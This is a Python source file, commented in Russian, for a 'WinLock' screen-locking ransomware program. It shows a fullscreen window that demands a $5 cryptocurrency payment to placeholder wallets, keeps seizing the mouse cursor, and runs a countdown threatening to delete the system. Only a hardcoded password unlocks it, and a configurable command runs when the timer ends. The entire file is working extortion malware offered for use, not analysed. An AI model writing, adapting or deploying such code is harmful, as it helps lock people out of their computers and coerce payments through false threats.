from tkinter import * 
import pyautogui 
import os
#import pygame 
read1ng=" "
BTC="BTC: wallet"
LTC="LTC: wallet"
ETH="ETH: wallet"


#XMRimg = pyautogui.screenshot('my_screenshot.png')
password=("haha_lol") #переменная с паролем от локера, можно установить что-то свое
t1me=7000 #переменная с временем таймера в секундах.
d3l="Удаление системы начато..." 
def block(): 
    #pyautogui.click(x=675,y=405) #делаем клик по координатам X и Y
    pyautogui.moveTo(x=670,y=890) #переводим мышку в позицию координат X и Y
    #screen.protocol("WM_DELETE_WINDOW",block) #Запрещаем использование комбинаций F4/alt+F4/Fn+F4, и при их использовании вызывает функцию block
    screen.update() 
def password_check(event):
    global read1ng 
    read1ng=field.get()
    if read1ng==password: 
        screen.destroy()
def systemrun():
    os.system("audacity") #Команда которую выполнить по истечении времени

screen=Tk()
screen.title("WinLock") 
screen.attributes("-fullscreen",True) 
screen.configure(background="#1c1c1c") 
pyautogui.FAILSAFE=False
field=Entry(screen,fg="green",justify=CENTER, borderwidth=0) 
but=Button(screen,text="Разблокировать", borderwidth=0) 
text0=Label(screen,text="Ваша система заблокирована!",font="TimesNewRoman 30",fg="white",bg="#1c1c1c")
DontPanic=Label(screen, text="Не паникуй, это не шифровальщик, твои файлы в полном порядке\nЭта программа только может стереть твою систему с лица Земли, тебе нечего бояться!",font="TimesNewRoman 24",fg="white",bg="#1c1c1c")
text=Label(screen,text="Вам необходимо перечислить 5$ на один из нижеприведённых кошельков",font="TimesNewRoman 30",fg="#32CD32",bg="#1c1c1c")

BTCimg = PhotoImage(file = './BTC-little.png')
LTCimg = PhotoImage(file = './LTC-little.png')
ETHimg = PhotoImage(file = './ETH-little.png')


BTClabel = Label(screen, image=BTCimg, borderwidth=0).place(x=350,y=420)
LTClabel = Label(screen, image=LTCimg, borderwidth=0).place(x=350,y=570)
ETHlabel = Label(screen, image=ETHimg, borderwidth=0).place(x=350,y=720)


textBTC=Label(screen, text=BTC,font="TimesNewRoman 16",fg="yellow",bg="#1c1c1c")
textLTC=Label(screen,text=LTC,font="TimesNewRoman 16",fg="yellow",bg="#1c1c1c")
textETH=Label(screen,text=ETH,font="TimesNewRoman 16",fg="yellow",bg="#1c1c1c")
text1=Label(screen,text="Не перезагружайте компьютер, это удалит вашу систему!",font = "TimesNewRoman 16",fg="red",bg="#1c1c1c") 
Citate=Label(screen,text="Лох не мамонт, лох не вымрет.\n© Сократ",font = "TimesNewRoman 16",fg="red",bg="#1c1c1c") 
l=Label(text=t1me,font="Arial 22",fg="red",bg="#1c1c1c")
l1=Label(text="До удаления системы осталось:",fg="white",bg="#1c1c1c",font="Arial 15")
but.bind('<Button-1>',password_check)
text.place(x=300,y=170)
DontPanic.place(x=300,y=240)
field.place(width=150,height=50,x=600,y=790) 
but.place(width=150,height=50,x=600,y=860)
text0.place(x=600,y=110)
text1.place(x=410,y=330)

textBTC.place(x=410,y=430)
textLTC.place(x=410,y=580)
#LTCimg.place(x=380,y=580)
textETH.place(x=410,y=730)
#ETHimg.place(x=380,y=730)
l1.place(x=20,y=70) 
l.place(x=20,y=100)
Citate.place(x=900,y=820)
#pygame.init()
#aud=pygame.mixer.Sound("message.wav") 
#aud.play()
screen.update()
pyautogui.moveTo(x=670,y=890) #переводим мышку в позицию координат X и Y

while read1ng!=password: 
    l.configure(text=t1me)
    screen.after(200) #делаем задержку в 200 миллисекунд.
    if t1me==0: 
        t1me=d3l
        systemrun()

    if t1me!=d3l: 
        t1me=t1me-1 
    block() 
